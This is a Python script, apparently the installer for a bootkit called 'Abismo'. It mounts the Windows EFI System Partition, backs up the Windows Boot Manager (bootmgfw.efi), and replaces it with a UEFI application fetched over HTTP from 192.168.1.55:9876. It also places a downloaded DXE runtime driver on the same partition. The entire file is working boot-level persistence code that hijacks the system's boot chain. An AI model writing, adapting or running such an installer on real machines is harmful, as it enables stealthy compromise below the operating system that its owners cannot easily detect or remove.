# Imports
import os
import argparse
import subprocess
import requests
import shutil
import win32com.shell.shell as shell



# Execute command
def execute_command(command):

    try:

        # Command
        subprocess.run(command, check=True, shell=True)

    except subprocess.CalledProcessError as e:
        print(f'AbismoInstaller [AbismoInstaller.py] (execute_command) - Error executing the command: {e}\n')



# Backup file
def backup_file(source_file, destination_file):

    try:

        if not os.path.exists(destination_file):

            # Copy file to new location
            shutil.copy(source_file, destination_file)
    
    except Exception as e:
        print(f'AbismoInstaller [AbismoInstaller.py] (copy_file) - Error copying the file: {e}\n')



# Download file
def download_file(servers, path_file):

    # Loop
    for server in servers:

        try:

            # Make http request
            response = requests.get(server)

            # Check server responds
            if response.status_code == 200:

                # Save file
                with open(path_file, 'wb') as file:
                    file.write(response.content)

        except requests.exceptions.ConnectionError:
            pass
        except Exception as e:
            print(f'AbismoInstaller [AbismoInstaller.py] (download_file) - Error downloading the file: {e}\n')



# Main
def main():

    # Variables
    var_esp_mount = 'mountvol M: /S'
    var_esp_unmount = 'mountvol M: /D'
    var_windows_boot_manager_file = 'M:\\EFI\\Microsoft\\Boot\\bootmgfw.efi'
    var_windows_boot_manager_backup = 'M:\\EFI\\Microsoft\\Boot\\bootmgfwcp.efi'
    var_windows_boot_manager_driver = 'M:\\EFI\\Microsoft\\Boot\\bootmgfwdd.efi'
    servers_uefi_app = ['http://192.168.1.55:9876/AbismoApplicationUEFI.efi']
    servers_dxe_runtime_driver = ['http://192.168.1.55:9876/AbismoDriverDXERuntime.efi']


    # Hello World
    print('AbismoInstaller [AbismoInstaller.py] (main) - Hello World\n')


    # Run As
    if not shell.IsUserAnAdmin():
        print('This Script must be executed as Administrator\n')
        print('Start-Process -FilePath "powershell" -ArgumentList "Start-Process powershell -Verb RunAs"\n')
        exit(1)


    # Mount ESP
    print('AbismoInstaller [AbismoInstaller.py] (main) - Mount ESP\n')
    execute_command(var_esp_mount)


    # Backup Windows Boot Manager
    print('AbismoInstaller [AbismoInstaller.py] (main) - Backup Windows Boot Manager\n')
    backup_file(var_windows_boot_manager_file, var_windows_boot_manager_backup)


    # Download UEFI Application
    print('AbismoInstaller [AbismoInstaller.py] (main) - Download UEFI Application\n')
    download_file(servers_uefi_app, var_windows_boot_manager_file)

    # Download DXE Runtime Driver
    print('AbismoInstaller [AbismoInstaller.py] (main) - Download DXE Runtime Driver\n')
    download_file(servers_dxe_runtime_driver, var_windows_boot_manager_driver)
    

    # Unmount ESP
    print('AbismoInstaller [AbismoInstaller.py] (main) - Unmount ESP\n')
    execute_command(var_esp_unmount)


    # Bye
    print('AbismoInstaller [AbismoInstaller.py] (main) - Bye\n')


if __name__ == "__main__":
    main()
